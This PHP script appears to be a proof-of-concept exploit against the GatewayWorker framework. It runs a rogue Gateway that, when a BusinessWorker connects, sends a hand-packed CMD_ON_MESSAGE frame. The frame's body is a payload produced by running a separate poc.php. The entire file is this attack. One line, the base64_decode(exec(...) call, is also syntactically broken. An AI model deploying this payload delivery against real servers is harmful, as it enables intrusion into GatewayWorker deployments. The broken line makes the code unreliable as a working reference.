<?php 
use \Workerman\Worker;
use \Workerman\WebServer;
use \GatewayWorker\Gateway;
use \GatewayWorker\BusinessWorker;
use \Workerman\Autoloader;
use \GatewayWorker\Protocols\GatewayProtocol;

require_once __DIR__ . '/vendor/autoload.php';


$gateway = new Gateway("tcp://0.0.0.0:8283");#Demo 的tcp聊天，只是为了成功申请对象

$gateway->name = 'TestGateway';

$gateway->count = 1;
$gateway->lanIp = '127.0.0.1';
$gateway->startPort = 4000;

$gateway->registerAddress = '127.0.0.1:1238';


$t=base64_decode(exec('php poc.php');
$gateway->onBusinessWorkerConnected=function($connection)
{
    global $t;
    $data=GatewayProtocol::$empty;
    $data['cmd']=GatewayProtocol::CMD_ON_MESSAGE;
    $data['flag'] = 0;
    $data['body'] = $t;
    $ext_len      = strlen($data['ext_data']);
    $package_len  = 28 + $ext_len + strlen($data['body']);
    $buffer = pack("NCNnNnNCnN", $package_len,
        $data['cmd'], $data['local_ip'],
        $data['local_port'], $data['client_ip'],
        $data['client_port'], $data['connection_id'],
        $data['flag'], $data['gateway_port'],
        $ext_len) . $data['ext_data'] . $data['body'];
    var_dump(substr($buffer,28));
    $connection->send($buffer, true);
};

if(!defined('GLOBAL_START'))
{
    Worker::runAll();
}
